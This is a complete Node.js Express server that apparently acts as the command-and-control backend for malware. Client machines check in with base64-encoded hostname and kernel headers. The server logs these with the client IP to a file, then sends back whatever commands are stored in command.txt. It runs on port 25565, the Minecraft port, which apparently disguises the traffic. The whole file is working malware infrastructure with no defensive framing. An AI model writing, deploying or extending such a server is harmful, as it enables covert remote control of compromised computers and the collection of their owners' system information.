const express = require('express');
const fs = require('fs');

const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    let basicInfos = "";

    const hostname = Buffer.from(req.headers["x-server-hostname"], 'base64').toString();
    basicInfos += `Nouveau client :\nHostname: ${hostname} `;

    const ip = req.ip;
    basicInfos += `IP: ${ip} `;

    const kernel = Buffer.from(req.headers["x-server-kernel"], 'base64').toString();
    basicInfos += `Kernel: ${kernel} `;

    fs.appendFile('clients.txt', basicInfos, (err) => {
        if (err) {
            console.error(err);
            return;
        }
    });

    fs.readFile('command.txt', 'utf8' , (err, data) => {
        if (err) {
            console.error(err);
            return;
        }
        res.send(data);
    });
});

const PORT = 25565;
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}/`);
});
